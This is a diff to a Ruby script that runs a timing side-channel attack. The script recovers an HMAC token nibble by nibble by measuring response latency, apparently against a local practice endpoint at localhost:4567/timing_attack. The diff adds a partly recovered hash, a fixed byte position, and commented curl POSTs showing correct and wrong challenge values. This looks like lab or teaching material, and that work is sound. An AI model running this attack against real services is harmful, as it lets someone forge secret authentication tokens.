@@ -33,10 +33,11 @@ trials=[]
 dist=Distribution.new
 
 #length of the token is 40
-hmac = "0000000000000000000000000000000000000000"
+#hmac = "0000000000000000000000000000000000000000"
+hmac = "ef2542fe60000000000000000000000000000000"
 
-(0..0).each do |i|
-  
+#hmac position
+[8].each do |i|
   number_of_times.times do |k| # try each byte k times to find slowest one statisticly
     (0..15).each {|i|dataset["%1x" % i]=[]} #reset
     (0..15).each do |j|
@@ -58,8 +59,6 @@ hmac = "0000000000000000000000000000000000000000"
 
   end
 end
-
-
 p dist.sorted_avg
 
 #dist.each do |k,v|
@@ -71,5 +70,10 @@ p dist.sorted_avg
 #  p "#{k} median = #{ ds.median }, deviation=#{ds.deviation}"
 #end
 
+#correct POST 
 #curl -v -d "username=utest&hash_challenge=ef2542fe60be70722119beaec6ca770ad815a779" http://localhost:4567/timing_attack
+
+#wrong POST 
+#curl -v -d "username=utest&hash_challenge=ef2542fe60be70722119beaec6ca770ad815a776" http://localhost:4567/timing_attack
+
 #ef2542fe60be70722119beaec6ca770ad815a779
